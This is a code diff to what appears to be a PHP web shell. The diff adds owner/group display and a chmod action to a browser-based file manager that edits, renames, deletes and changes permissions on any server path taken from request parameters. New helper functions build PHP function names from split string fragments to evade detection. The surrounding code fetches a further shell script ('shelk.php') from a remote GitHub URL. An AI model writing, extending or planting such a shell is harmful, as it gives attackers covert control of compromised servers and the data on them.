@@ -89,6 +89,7 @@
               <tr>
                 <th>Name</th>
                 <th>Size</th>
+                <th>Owner / Group</th>
                 <th>Permission</th>
                 <th>Actions</th>
               </tr>
@@ -105,11 +106,15 @@
                       <?= $items; ?>
                     </a>
                   </td>
-                  <td width="70">---</td>
-                  <td width="80" class="<?= $color; ?>"><?= hi_permission($path . $separator . $items); ?></td>
-                  <td width="90">
+                  <td>---</td0>
+                  <td><?= gor($path . $separator . $items); ?> / <?= ggr($path . $separator . $items); ?></td>
+                  <td class="<?= $color; ?>"><?= hi_permission($path . $separator . $items); ?></td>
+                  <td>
                     <a href='?path=<?= $path . $separator . $items; ?>&a=rename'>
                       Rename
+                    </a>
+                    <a href='?path=<?= "$path$separator$items"; ?>&a=chmod'>
+                      Chmod
                     </a>
                     <a href='?path=<?= "$path$separator$items"; ?>&a=delete' onclick="return confirm('Delete folder <?= $items; ?>?')">
                       Delete
@@ -128,14 +133,18 @@
                         <?= $items; ?>
                       </a>
                     </td>
-                    <td width="70"><?= getFileSize("$path$separator$items"); ?></td>
-                    <td width="80" class="<?= $color; ?>"><?= hi_permission($path . $separator . $items); ?></td>
-                    <td width="90">
+                    <td><?= getFileSize("$path$separator$items"); ?></td>
+                    <td><?= gor($path . $separator . $items); ?> / <?= ggr($path . $separator . $items); ?></td>
+                    <td class="<?= $color; ?>"><?= hi_permission($path . $separator . $items); ?></td>
+                    <td>
                       <a href='?file=<?= "$path$separator$items"; ?>&a=editFile'>
                         Edit
                       </a>
                       <a href='?file=<?= "$path$separator$items"; ?>&a=rename'>
                         Rename
+                      </a>
+                      <a href='?file=<?= "$path$separator$items"; ?>&a=chmod'>
+                        Chmod
                       </a>
                       <a href='?file=<?= "$path$separator$items"; ?>&a=delete' onclick="return confirm('Delete file <?= $items; ?>?')">
                         Delete
@@ -219,6 +228,7 @@
         $content = base64_encode($_POST["content"]);
         if (doFile($path . $separator . $file, $content)) {
           $filename = basename($file);
+
           echo "<script>alert('$filename Edited'); window.location = '?path=$path';</script>";
         } else {
           echo "Failed to create";
@@ -255,7 +265,7 @@
           <button type="submit" class="btn-primary">Submit</button>
         </form>
       </div>
-    <?php
+      <?php
       if (isset($_POST["newname"])) {
         $newname = $_POST["newname"];
         $path = (isset($_GET["file"])) ? dirname($_GET["file"]) : dirname($_GET["path"]);
@@ -265,6 +275,29 @@
           "Failed to rename";
         }
       }
+    } elseif (isset($_GET['a']) && $_GET["a"] == "chmod") {
+      $item = (isset($_GET["file"])) ? $_GET["file"] : $_GET["path"];
+
+      if (isset($_POST["chmod"])) {
+        $newPermissions = octdec($_POST["chmod"]);
+
+        if (chmod($item, $newPermissions)) {
+          echo "<script>alert('" . basename($item) . " permission has changed!'); window.location = '?path=$path';</script>";
+        } else {
+          echo "Failed to chmod";
+        }
+      }
+      ?>
+      <div class="card">
+        <form method="post">
+          <div class="mb-1">
+            <label for="chmod" class="label-form">Change <?= basename($item); ?> perms: </label>
+            <input type="text" name="chmod" id="chmod" value="<?= sprintf("%o", fileperms($item) & 0777); ?>" required>
+          </div>
+          <button type="submit" class="btn-primary">Submit</button>
+        </form>
+      </div>
+    <?php
     } elseif (isset($_GET['a']) && $_GET["a"] == "toolkit") {
       $cc = curl_init();
       curl_setopt($cc, CURLOPT_URL, "https://raw.githubusercontent.com/nastar-id/kegabutan/master/shelk.php");
@@ -342,6 +375,59 @@
     return $info;
   }
 
+  function ggr($fl)
+  {
+    $a = "fun" . "cti" . "on_" . "exis" . "ts";
+    $b = "po" . "si" . "x_ge" . "tgr" . "gid";
+    $c = "fi" . "le" . "gro" . "up";
+    if ($a($b)) {
+      if (!$a($c)) {
+        return "?";
+      }
+      $d = $b($c($fl));
+      if (empty($d)) {
+        $e = $c($fl);
+        if (empty($e)) {
+          return "?";
+        } else {
+          return $e;
+        }
+      } else {
+        return $d['name'];
+      }
+    } elseif ($a($c)) {
+      return $c($fl);
+    } else {
+      return "?";
+    }
+  }
+
+  function gor($fl)
+  {
+    $a = "fun" . "cti" . "on_" . "exis" . "ts";
+    $b = "po" . "s" . "ix_" . "get" . "pwu" . "id";
+    $c = "fi" . "le" . "o" . "wn" . "er";
+    if ($a($b)) {
+      if (!$a($c)) {
+        return "?";
+      }
+      $d = $b($c($fl));
+      if (empty($d)) {
+        $e = $c($fl);
+        if (empty($e)) {
+          return "?";
+        } else {
+          return $e;
+        }
+      } else {
+        return $d['name'];
+      }
+    } elseif ($a($c)) {
+      return $c($fl);
+    } else {
+      return "?";
+    }
+  }
   ?>
   <div class='menu'>
     <input class='toggle' id='menu' type='checkbox' style="display: none;">
